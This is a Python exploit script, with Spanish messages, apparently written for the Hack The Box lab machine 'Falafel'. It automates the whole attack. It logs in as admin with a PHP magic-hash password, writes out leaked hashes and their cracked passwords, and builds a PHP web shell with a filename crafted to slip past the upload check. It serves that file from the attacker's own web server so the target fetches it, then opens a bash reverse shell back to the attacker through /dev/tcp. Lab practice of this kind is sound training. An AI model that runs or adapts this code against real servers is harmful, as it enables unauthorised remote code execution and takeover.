import time
import requests
import requests
import sys
import socketserver
import http.server
import signal
import os
import threading

print("""
 _             _             ___  _____ 
| |           (_)           |__ \| ____|""")
time.sleep(0.1)
print("| | _____ _ __ _  __ _  __ _   ) | |__  ")
time.sleep(0.1)
print("| |/ / _ \ '__| |/ _` |/ _` | / /|___ \ ")
time.sleep(0.1)
print("|   <  __/ |  | | (_| | (_| |/ /_ ___) |")
time.sleep(0.1)
print("|_|\_\___|_|  | |\__,_|\__, |____|____/ ")
time.sleep(0.1)
print("             _/ |       __/ |           ")
time.sleep(0.1)
print("            |__/       |___/       ")
time.sleep(0.1)
print('KERJAG25 - FALAFEL HTB WWW-DATA SHELL\n')
ip = input('Introduce tu IP (tun0): ')
port = int(input('Puerto con el que quieras romper la mamona\n\n[!]IMPORTANTE\nSi el puerto que quieres está por debajo del 1024 requeriras ejecutar este script como root\nrecomiendo un puerto superior al 1024\n\nIntroduce tu puerto: '))
url = 'http://10.10.10.73/login.php'



def def_handler(sig, frame):
    print('[-]Exit')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def ping(host):
    response = os.system(f'ping -c 1 {host} >/dev/null 2>&1')

    if response == 0:
        return True
    else:
        return False


if ping('10.10.10.73') == False:
    print('[-]Conexión con la máquina fallida')
    time.sleep(0.5)
    print('[-}La máquina está activa?')
    time.sleep(0.5)
    print('[-]No olvides correr este script como root\n')
    sys.exit(1)

else:
    time.sleep(0.5)
    print('[+]Conexión exitosa')
    time.sleep(0.5)
    r = requests.get('http://10.10.10.73')
    
    
    if r.status_code == 200:
        print(f'[+]HTTP/{r.status_code} OK')
        time.sleep(0.5)
        print('[+]Creando directorios temporales')
        os.system('mkdir ./Falafel')
        time.sleep(0.5)
        
        
        if os.system('wget http://10.10.10.73/robots.txt >/dev/null 2>&1; wget http://10.10.10.73/cyberlaw.txt >/dev/null 2>&1; mv robots.txt ./Falafel; mv cyberlaw.txt ./Falafel') == 0:
            
            print('[+]*.txt')
            time.sleep(0.5)
            print('[+]Hashes/Dehashed.txt')
            os.system('touch ./Falafel/hashes.txt')
            f = open('./Falafel/hashes.txt','w')
            f.write('admin:0e462096931906507119562988736854\nchris:d4ee02a22fc872e36d9e3751ba72ddc8')
            f.close()
            
            
            os.system('touch ./Falafel/dehashed.txt')
            f0 = open('./Falafel/dehashed.txt','w')
            f0.write('admin:¯\_(ツ)_/¯ puedes ingresar con "240610708"\nchris:juggling')
            f0.close()
            
            
            def shellconect():
                
                print('[+]Ingresando como admin')
                c = None

                try:
                    c = requests.session()
                    auth_data = {'username' : 'admin', 'password' : '240610708'}
                    r = c.post(url, data=auth_data)
                    if "Upload" in r.text:
                        time.sleep(0.5)
                        print('[+]Logueo como admin exitoso')
                        time.sleep(2)
                        ocho = requests.get('http://127.0.0.1:8080')        
                        
                        if ocho.status_code == 200:
                            
                            print(f'[+]HTTP/{ocho.status_code} OK')
                            time.sleep(0.5)
                            print('[+]Preparando Explotación...')
                            os.system("""echo '<?php\n       echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>";\n?>' > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif""")
                            time.sleep(0.5)
                            print('[+]PHP malicioso listo')
                            time.sleep(0.5)   

                            try:
                                print('[+]Uploading file...')
                                uploadurl = 'http://10.10.10.73/upload.php'
                                dataupload = {'url' : f'http://{ip}:8080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif'}
                                z = c.post(uploadurl, data=dataupload)
                                
                                if "200 OK" in z.text:
                                    time.sleep(0.5)
                                    print('[+]Upload exitoso')
                                    time.sleep(0.5)
                                    print('[+]Ejecutando comandos ;)...')
                                    time.sleep(0.5)
                                    os.system('touch tmp')
                                    tmp = open('tmp','w')
                                    tmp.write(z.text)
                                    tmp.close
                                    os.system('''echo $(cat tmp| grep "/var/www/html/uploads" | awk '{print $3}' | awk -F '/' '{print $6}' | tr -d ';') > ruta.txt''')
                                    os.system('rm tmp; mv ruta.txt ./Falafel; mv AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif ./Falafel')
                                    print('[+]Explotando...')
                                    time.sleep(0.5)
                                    read = open('./Falafel/ruta.txt','r')
                                    mensaje = read.read()
                                    print(f'''[!]ESTA ES TU RUTA: {mensaje}''')
                                    f.close()
                                    mensaje2 = input('Introduce tu ruta (se encuentra arriba): ')
                                    comp = requests.get(f'http://10.10.10.73/uploads/{mensaje2}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=whoami')

                                    if "www-data" in comp.text:
                                        print('[+]Ejecución de comandos exitosa')
                                        os.system(f'''curl -s -X GET "http://10.10.10.73/uploads/{mensaje2}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/{ip}/{port}%200%3E%261%22"''')  
                                        

                                    else:
                                        print('Algo salió mal durante la ejecución de comandos')
                                        sys.exit(1)

                                else:
                                    print('[-]Algo salió mal al subir el archivo')
                                    print('Ctrl+C para salir')
                                    sys.exit(1)
                            except:
                                sys.exit(1)
                        else:
                            print('[-]Algo salió mal al levantar http en puerto 8080')
                            print('Ctrl+C para salir')
                            sys.exit(1)
                    else:
                        print('[-]Algo salió mal durante el logueo')
                        print('Ctrl+C para salir')
                        sys.exit(1)
                except:
                    sys.exit(1)
            
            thread = threading.Thread(target=shellconect)
            thread.start()

            while thread.is_alive():
                time.sleep(2)
                hport = 8080
                Handler = http.server.SimpleHTTPRequestHandler

                with socketserver.TCPServer(("", hport), Handler) as httpd:
                    print("serving at port", hport)
                    httpd.serve_forever()
                    
        else:
            print('[-]Algo salió mal')
            print('Ctrl+C para salir')

    else:
        print(f'[-]HTTP/{r.status_code}')
        print('[-]Algo salió mal')
        print('Ctrl+C para salir')

